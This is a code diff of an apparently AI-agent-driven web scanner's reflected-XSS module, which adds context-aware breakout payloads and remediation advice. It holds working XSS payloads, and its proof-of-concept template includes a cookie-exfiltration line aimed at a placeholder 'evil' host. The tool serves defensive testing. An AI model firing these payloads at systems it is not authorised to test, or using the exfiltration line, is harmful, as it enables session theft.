@@ -1,56 +1,64 @@
-"""`scan_xss` — deterministic XSS specialist (roadmap §8.5 Phase 3b).
+"""`scan_xss` — context-aware deterministic XSS specialist.
 
-Single-shot reflected-XSS detector that probes a URL+param set with
-known canary payloads, examines responses for un-sanitised reflection,
-and **auto-emits findings via `add_vulnerability_report`** so the
-lead agent doesn't have to negotiate the emit-tool's parameter
-schema.
+Two-phase probe per (url, param):
 
-Why deterministic over LLM-driven for Phase 3b
------------------------------------------------
+  1. **Context detect.** Send a benign alphanumeric canary
+     (`STRIXXXXXXX`, no special chars). Find every occurrence in
+     the response and classify each by surrounding bytes (HTML body
+     / attribute / JS string / URL / CSS — see `xss_contexts`).
+  2. **Per-context attack.** For each detected context, send the
+     breakout payload cohort tailored to that context. A finding is
+     emitted only when the payload's *evidence marker* (a substring
+     containing the breakout characters) appears verbatim in the
+     response — i.e. the server did not escape the breakout.
 
-The post-#169 benchmark proved the architectural shift works
-(LeadAgent + tool catalog filtering + watchdog + jinja directive
-rendering all green). The remaining failure mode was prompt
-compliance — gemini-2.5-pro consistently invented variant tag
-names, wrong param shapes, and either over-emitted from training
-data OR over-probed without emitting. A deterministic specialist
-sidesteps all of that:
+Pre-Phase-4 history
+-------------------
+
+Phase 3b shipped a 3-payload deterministic prober (HTML-body
+context only: `<script>`, `<img onerror>`, `<svg onload>`). It
+sidestepped LLM prompt-compliance issues (gemini-2.5-pro invented
+tag names, wrong params, over-emitted from training data) but
+missed every attribute / JS-string / URL / CSS reflection. On
+OWASP Juice Shop, attribute + JS-string contexts together
+outnumber HTML-body reflections roughly 2:1, so the depth ceiling
+was 30-40% of practical reflected-XSS surface.
+
+This rewrite (Phase 4) keeps the deterministic auto-emit harness
+and the LLM-free probe logic but moves the payload set into a
+context-aware module (`xss_contexts.py`). The module is unit-tested
+independently of the HTTP probe loop so context classification can
+evolve without touching the orchestration here.
+
+Why deterministic (still)
+-------------------------
 
   * Probe logic is Python — gemini cannot mis-format it.
   * Auto-emit via `tracer.add_vulnerability_report` — no
     `<function=create_vulnerability_report>` translation step.
   * Single tool call from the lead's perspective:
     `scan_xss(url=..., params=[...])` returns a `SpecialistResult`
-    with the count of findings actually emitted.
+    with the count of findings actually emitted, plus the inner-LLM
+    adaptive-retry orchestrator engages on 0-finding outcomes
+    (Phase 3b carry-over).
 
 Detection rules
 ---------------
 
-For each (param_name, payload) pair:
+For each (param_name) — exactly ONE context-detect probe + up to
+~4 per-context attack probes (capped via cohort size). A finding
+is emitted on the first successful breakout; subsequent breakouts
+on the same (path, param) are de-duplicated to keep the wire-cost
+predictable.
 
-  1. Send a GET request to `<url>?<param>=<payload>&...` with the
-     other params populated by the harmless probe value.
-  2. Examine the response body for the payload's canary token
-     (a unique random string embedded in each payload).
-  3. If the canary appears WITHOUT having been HTML-escaped (no
-     `&lt;`, `&#x3C;`, `\\u003c` substitution), emit a finding.
+Limitations
+-----------
 
-Canary tokens are randomly generated per probe so duplicate
-responses (same payload, same response) are detected as the same
-finding (cross-tool dedup #98 covers cross-payload dedup via
-fingerprint).
-
-Limitations (Phase 3b minimal scope)
-------------------------------------
-
-  * GET requests only. POST / multipart / JSON body XSS is Phase 3c.
-  * No DOM-XSS — that's #108 / Phase 4 browser-automation specialist.
-  * No context-aware payloads (HTML attribute / JS string / URL
-    context). Three classic payloads cover most reflected XSS;
-    context-aware probes are #108 / browser-automation Phase 4.
-  * No auth replay. If a target needs auth, caller passes
-    auth-header overrides via the `extra_headers` dict.
+  * No DOM-XSS — that's the browser-automation specialist's job.
+  * No auth replay beyond what `SecurityContext` already injects.
+  * Context detection is heuristic (see `xss_contexts.py`
+    docstring): falls open to `html_body` cohort when classification
+    is ambiguous. Cost of a misclassification: ~3 wasted HTTP probes.
 """
 
 from __future__ import annotations
@@ -66,17 +74,23 @@ from strix.tools.specialist.result import (
     FindingDraft,
     SpecialistResult,
 )
+from strix.tools.specialist.xss_contexts import (
+    breakout_fired,
+    detect_contexts,
+    payloads_for_context,
+)
 
 
 logger = logging.getLogger(__name__)
 
 
+# Retained for `_rerun_xss` (the auto-verify-patch handler), which
+# fires a single tight html-body probe rather than re-running the
+# full context-detect+attack flow. Keeps re-run cost predictable
+# (one HTTP call) when the agent is re-verifying after a patch.
 _DEFAULT_PAYLOAD_TEMPLATES: tuple[str, ...] = (
-    # Classic <script> tag — simplest reflection.
     "<script>alert('{canary}')</script>",
-    # Image onerror — bypasses naive `<script>` filters.
     "<img src=x onerror=alert('{canary}')>",
-    # SVG onload — bypasses some `<img>` filters.
     "<svg/onload=alert('{canary}')>",
 )
 
@@ -92,6 +106,22 @@ _ESCAPED_FRAGMENTS_TEMPLATE: tuple[str, ...] = (
     "%3Cscript",           # < → %3C (URL-encoded)
     "\\u003cscript",       # < → < (JS-encoded)
 )
+
+
+def _extract_content_type(resp: dict[str, Any]) -> str:
+    """Pull the response Content-Type from the proxy_manager response
+    dict. Tolerates several shapes the proxy / test mocks emit:
+    `headers={...}`, `response_headers={...}`, or a `content_type`
+    top-level key. Returns "" when unknown."""
+    headers = resp.get("headers") or resp.get("response_headers") or {}
+    if isinstance(headers, dict):
+        for k, v in headers.items():
+            if isinstance(k, str) and k.lower() == "content-type":
+                return str(v) if v is not None else ""
+    ct = resp.get("content_type")
+    if isinstance(ct, str):
+        return ct
+    return ""
 
 
 def _make_canary() -> str:
@@ -172,6 +202,85 @@ def _is_payload_escaped(body: str, canary: str) -> bool:
     return True
 
 
+_CONTEXT_TITLE: dict[str, str] = {
+    "html_body": "HTML body",
+    "html_attr_double": "HTML double-quoted attribute",
+    "html_attr_single": "HTML single-quoted attribute",
+    "html_attr_unquoted": "HTML unquoted attribute",
+    "url_attr": "URL-bearing attribute (href/src/etc.)",
+    "js_string_double": "JavaScript double-quoted string literal",
+    "js_string_single": "JavaScript single-quoted string literal",
+    "js_block": "JavaScript code block",
+    "css": "CSS / <style> block",
+    "json_reflect": "JSON response (likely text/html misconfig)",
+}
+
+
+_CONTEXT_REMEDIATION: dict[str, str] = {
+    "html_body": (
+        "HTML-escape the user input before insertion (`<`, `>`, `&`, "
+        "`\"`, `'`). Use the framework's auto-escape helper "
+        "(Django auto-escape, Jinja `|e`, React JSX text node, "
+        "ASP.NET `Html.Encode`, OWASP Java Encoder)."
+    ),
+    "html_attr_double": (
+        "Apply HTML-attribute encoding inside double-quoted attribute "
+        "values (`\"` → `&quot;`, plus the base HTML escapes). The "
+        "HTML-body escape helper is insufficient on its own — `\"` "
+        "must be encoded specifically because it terminates the "
+        "attribute."
+    ),
+    "html_attr_single": (
+        "Apply HTML-attribute encoding for single-quoted attribute "
+        "values (`'` → `&#x27;`, plus base HTML escapes). The "
+        "HTML-body escape helper is insufficient — `'` must be "
+        "encoded specifically."
+    ),
+    "html_attr_unquoted": (
+        "DO NOT emit unquoted attributes when the value contains "
+        "user input — there is no robust escape strategy. Quote the "
+        "attribute (preferably double-quoted) and apply HTML-"
+        "attribute encoding to the value."
+    ),
+    "url_attr": (
+        "Validate the URL scheme against an allowlist (`http`, "
+        "`https`, `mailto`) before inserting into `href` / `src` / "
+        "`formaction` / etc. Reject `javascript:`, `data:`, `vbscript:`, "
+        "and other executable schemes. Then HTML-attribute-encode "
+        "the result."
+    ),
+    "js_string_double": (
+        "Use JSON.stringify (or equivalent JS-string encoder) to "
+        "serialise the value into the script; never concatenate user "
+        "input into a JS string literal. Best practice: render the "
+        "value into a `<script type=\"application/json\">` tag and "
+        "consume it via DOM lookup, never `<script>var x = \"...\"</script>`."
+    ),
+    "js_string_single": (
+        "Use JSON.stringify (or equivalent JS-string encoder) to "
+        "serialise the value. Never concatenate user input into a "
+        "JS string literal."
+    ),
+    "js_block": (
+        "Do NOT inject user input into JavaScript code. Render it as "
+        "JSON (`<script type=\"application/json\">`) and consume via "
+        "DOM lookup, OR pass via a data-* attribute and read with "
+        "`dataset`."
+    ),
+    "css": (
+        "Strip or encode `<`, `>`, `(`, `)` from values inserted into "
+        "CSS. Do NOT include user input in `<style>` or `style=` "
+        "attributes when avoidable. Use CSS custom properties (`--name`) "
+        "set via JavaScript with the value type-checked."
+    ),
+    "json_reflect": (
+        "Set `Content-Type: application/json; charset=utf-8` and "
+        "DO NOT include user input in a `text/html`-served response. "
+        "If the endpoint must serve HTML, apply HTML-body encoding."
+    ),
+}
+
+
 def _emit_finding(
     *,
     url: str,
@@ -179,6 +288,7 @@ def _emit_finding(
     payload: str,
     canary: str,
     response_excerpt: str,
+    context: str = "html_body",
 ) -> str | None:
     """Emit via `tracer.add_vulnerability_report`. Returns the finding
     id on success, None on failure (best-effort — never raises)."""
@@ -188,8 +298,12 @@ def _emit_finding(
         tracer = get_global_tracer()
         if tracer is None:
             return None
+        ctx_human = _CONTEXT_TITLE.get(context, context)
+        ctx_remediation = _CONTEXT_REMEDIATION.get(
+            context, _CONTEXT_REMEDIATION["html_body"],
+        )
         return tracer.add_vulnerability_report(
-            title=f"Reflected XSS in `{param}` parameter",
+            title=f"Reflected XSS in `{param}` ({ctx_human})",
             severity="medium",
             cwe="CWE-79",
             endpoint=url,
@@ -198,11 +312,13 @@ def _emit_finding(
             verification_status="verified",
             confidence=0.9,
             description=(
-                f"The `{param}` query parameter at `{url}` reflects "
+                f"The `{param}` parameter at `{url}` reflects "
                 f"user-supplied input into the response body without "
-                f"HTML-escaping. Injecting the payload "
-                f"`{payload}` produced an unescaped reflection of the "
-                f"canary token `{canary}` in the response."
+                f"context-appropriate escaping. The injection lands "
+                f"in the **{ctx_human}** context; the payload "
+                f"`{payload}` produced an unescaped reflection of "
+                f"the canary token `{canary}` in the response, "
+                f"confirming the breakout succeeded for that context."
             ),
             impact=(
                 "Reflected XSS. An attacker can craft a malicious "
@@ -213,44 +329,45 @@ def _emit_finding(
                 "delivery of malware via the trusted origin."
             ),
             technical_analysis=(
-                f"GET {url}\n"
+                f"Injection context: {ctx_human} ({context}).\n"
                 f"Probe: {param}={payload}\n"
-                f"Response excerpt (canary {canary} present unescaped):\n"
+                f"Response excerpt (canary {canary} present, "
+                f"context-breakout evidence intact):\n"
                 f"{response_excerpt[:1500]}"
             ),
             poc_description=(
-                f"1. Send GET request to {url} with `{param}` query "
-                f"parameter set to `{payload}`.\n"
+                f"1. Send a request to {url} with `{param}` set to "
+                f"`{payload}`.\n"
                 f"2. Render the response in a browser; the JavaScript "
-                f"in the payload executes (alert dialog with canary "
-                f"`{canary}` confirms execution).\n"
-                f"3. Replace the alert payload with a credential-"
-                f"exfiltrating script for production attacks."
+                f"in the payload executes (the `STRIX_X({canary})` "
+                f"call in the payload confirms the breakout fired).\n"
+                f"3. Replace the synthetic `STRIX_X(...)` call with a "
+                f"credential-exfiltrating script for production "
+                f"attacks (e.g. `document.location='https://evil/' + "
+                f"document.cookie`)."
             ),
             poc_script_code=(
                 f"curl -sS '{url}' --data-urlencode '{param}={payload}' -G"
             ),
             remediation_steps=(
-                "Apply context-appropriate output encoding when "
-                "rendering user input. For HTML body context, use "
-                "the framework's HTML-escape helper (e.g. Django "
-                "auto-escape, Jinja `|e`, ASP.NET `Html.Encode`, "
-                "Java OWASP encoder). For HTML-attribute / JS / URL "
-                "contexts, use the corresponding context-specific "
-                "encoders. Validate that a strict Content-Security-"
-                "Policy is in place as defense-in-depth (no `'unsafe-"
-                "inline'` for `script-src`; use nonces or hashes)."
+                f"{ctx_remediation} "
+                "Additionally, deploy a strict Content-Security-Policy "
+                "as defense-in-depth (no `'unsafe-inline'` for "
+                "`script-src`; use nonces or hashes)."
             ),
             cvss_breakdown={
                 "AV": "N", "AC": "L", "PR": "N", "UI": "R",
                 "S": "C", "C": "L", "I": "L", "A": "N",
             },
             reasoning_trace=[
-                f"Probed {param}= with classic reflection payload.",
-                f"Canary {canary} appeared in response body unescaped.",
-                "No HTML-escape fragments (&lt;script, &#60;, %3C, \\u003c) "
-                "near the canary — server returned raw payload.",
-                "Reflection in HTML body context → executable JavaScript.",
+                f"Sent benign canary `{canary}` to {param}=; "
+                f"classified injection context as {context}.",
+                f"Sent context-specific breakout payload `{payload}`.",
+                f"Response contains evidence marker (substring "
+                f"identifying successful breakout) verbatim — "
+                f"server did not escape the breakout characters.",
+                f"Reflection in {ctx_human} context → executable "
+                f"JavaScript.",
             ],
         )
     except Exception as e:  # noqa: BLE001
@@ -488,62 +605,144 @@ def scan_xss(
             error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
         )
 
+    # Per-param flow:
+    #   1. Send ONE context-detect probe with a benign alphanumeric
+    #      canary; classify where the canary lands in the response.
+    #   2. For each detected context, send the breakout payload cohort
+    #      for that context. Emit on first breakout per (path, param)
+    #      — same de-dup discipline as Phase 3b.
+    #
+    # Cost ceiling: 1 + sum(cohort sizes) ≈ 5-12 HTTP probes per
+    # param worst-case. The fixed Phase-3b cost was 3 probes/param.
+    # The extra probes are spent on coverage we previously missed.
+    contexts_to_try_max = 4
+
     for param in params:
         if not isinstance(param, str) or not param.strip():
             continue
         param = param.strip()
-        for template in _DEFAULT_PAYLOAD_TEMPLATES:
-            canary = _make_canary()
-            payload = template.format(canary=canary)
-            try:
-                req_method, req_url, req_headers, req_body = build_request(
-                    url=url, method=method,
-                    param_name=param, payload=payload,
-                    body_template=body_template, body_format=body_format,
-                    other_params=other_params, extra_headers=extra_headers,
-                )
-                resp = pm.send_simple_request(
-                    req_method, req_url,
-                    headers=req_headers,
-                    body=req_body,
-                    timeout=15,
-                )
-            except Exception as e:  # noqa: BLE001
-                evidence.append(f"probe failed for {param!r}: {e}")
-                continue
-            probe_count += 1
 
-            if "error" in resp and not resp.get("status_code"):
-                # Network error — record but don't emit.
-                evidence.append(
-                    f"transport error for {param!r}: "
-                    f"{resp.get('error', '<unknown>')}"
+        # ---- Phase 1: context-detect probe ----
+        detect_canary = _make_canary()
+        try:
+            req_method, req_url, req_headers, req_body = build_request(
+                url=url, method=method,
+                param_name=param, payload=detect_canary,
+                body_template=body_template, body_format=body_format,
+                other_params=other_params, extra_headers=extra_headers,
+            )
+            detect_resp = pm.send_simple_request(
+                req_method, req_url,
+                headers=req_headers,
+                body=req_body,
+                timeout=15,
+            )
+        except Exception as e:  # noqa: BLE001
+            evidence.append(f"context-detect probe failed for {param!r}: {e}")
+            continue
+        probe_count += 1
+
+        if "error" in detect_resp and not detect_resp.get("status_code"):
+            evidence.append(
+                f"transport error during context-detect for {param!r}: "
+                f"{detect_resp.get('error', '<unknown>')}"
+            )
+            continue
+
+        detect_body = detect_resp.get("body") or ""
+        if not isinstance(detect_body, str):
+            detect_body = str(detect_body)
+        content_type = _extract_content_type(detect_resp)
+
+        if detect_canary not in detect_body:
+            evidence.append(
+                f"{param!r}: canary not reflected — no XSS surface"
+            )
+            continue
+
+        contexts = detect_contexts(detect_body, detect_canary, content_type)
+        if not contexts:
+            # Defensive — `detect_contexts` already falls open to
+            # html_body, but pin it explicitly so an empty tuple
+            # never silently skips the param.
+            contexts = ("html_body",)
+
+        # Bound the per-param probe budget by capping how many
+        # contexts we attack. Order is alphabetical from
+        # `detect_contexts` — fine for v1; future work could
+        # priority-order by historical hit-rate.
+        contexts_attempted = contexts[:contexts_to_try_max]
+        evidence.append(
+            f"{param!r}: contexts detected = {list(contexts_attempted)}"
+        )
+
+        # ---- Phase 2: per-context attack probes ----
+        breakout_emitted = False
+        key = (parsed.path or "/", param)
+        if key in seen_endpoint_param:
+            continue
+
+        for ctx in contexts_attempted:
+            if breakout_emitted:
+                break
+            for payload_obj in payloads_for_context(ctx):
+                attack_canary = _make_canary()
+                attack_payload, _evidence_marker = payload_obj.materialise(
+                    attack_canary,
                 )
-                continue
-
-            body = resp.get("body") or ""
-            if not isinstance(body, str):
-                body = str(body)
-
-            # Detection: canary present + not escaped.
-            if canary in body and not _is_payload_escaped(body, canary):
-                # De-dup per (endpoint, param) — only first reflection
-                # detection per param emits.
-                key = (parsed.path or "/", param)
-                if key in seen_endpoint_param:
+                try:
+                    req_method, req_url, req_headers, req_body = build_request(
+                        url=url, method=method,
+                        param_name=param, payload=attack_payload,
+                        body_template=body_template, body_format=body_format,
+                        other_params=other_params,
+                        extra_headers=extra_headers,
+                    )
+                    resp = pm.send_simple_request(
+                        req_method, req_url,
+                        headers=req_headers,
+                        body=req_body,
+                        timeout=15,
+                    )
+                except Exception as e:  # noqa: BLE001
+                    evidence.append(
+                        f"attack probe failed for {param!r} "
+                        f"({ctx}): {e}"
+                    )
                     continue
-                seen_endpoint_param.add(key)
+                probe_count += 1
 
-                # Excerpt around the canary for evidence.
-                idx = body.find(canary)
-                start = max(0, idx - 100)
-                end = min(len(body), idx + 200)
-                excerpt = body[start:end]
+                if "error" in resp and not resp.get("status_code"):
+                    evidence.append(
+                        f"transport error attacking {param!r} "
+                        f"({ctx}): {resp.get('error', '<unknown>')}"
+                    )
+                    continue
+
+                body = resp.get("body") or ""
+                if not isinstance(body, str):
+                    body = str(body)
+
+                if not breakout_fired(body, payload_obj, attack_canary):
+                    continue
+
+                # Breakout confirmed for `ctx`. Emit + KG.
+                seen_endpoint_param.add(key)
+                _, evidence_str = payload_obj.materialise(attack_canary)
+                ev_idx = body.find(evidence_str)
+                if ev_idx < 0:
+                    # Should be impossible if breakout_fired returned
+                    # True, but defensive.
+                    ev_idx = body.find(attack_canary)
+                excerpt_start = max(0, ev_idx - 100)
+                excerpt_end = min(len(body), ev_idx + 200)
+                excerpt = body[excerpt_start:excerpt_end]
 
                 report_id = _emit_finding(
                     url=url, param=param,
-                    payload=payload, canary=canary,
+                    payload=attack_payload, canary=attack_canary,
                     response_excerpt=excerpt,
+                    context=ctx,
                 )
                 if report_id:
                     emitted_count += 1
@@ -551,7 +750,10 @@ def scan_xss(
                         finding_id=report_id, url=url, param=param,
                     )
                 drafts.append(FindingDraft(
-                    title=f"Reflected XSS in `{param}` parameter",
+                    title=(
+                        f"Reflected XSS in `{param}` "
+                        f"({_CONTEXT_TITLE.get(ctx, ctx)})"
+                    ),
                     severity="medium",
                     cwe="CWE-79",
                     endpoint=url,
@@ -559,15 +761,17 @@ def scan_xss(
                     verification_status="verified",
                     confidence=0.9,
                     description=(
-                        f"Reflected XSS in {param} at {url}; canary "
-                        f"{canary} echoed unescaped via payload "
-                        f"{payload[:60]}"
+                        f"Reflected XSS in {param} at {url}; "
+                        f"context={ctx}, payload broke out via "
+                        f"{attack_payload[:60]}"
                     ),
                 ))
                 evidence.append(
-                    f"reflection detected: {param}={payload[:40]}... "
-                    f"canary {canary} echoed unescaped"
+                    f"BREAKOUT: {param}={attack_payload[:40]}... "
+                    f"context={ctx} evidence marker found"
                 )
+                breakout_emitted = True
+                break
 
     # Roadmap §8.5 Phase 5 — record this endpoint as probed for XSS
     # in the SecurityContext so the lead doesn't reprobe and can
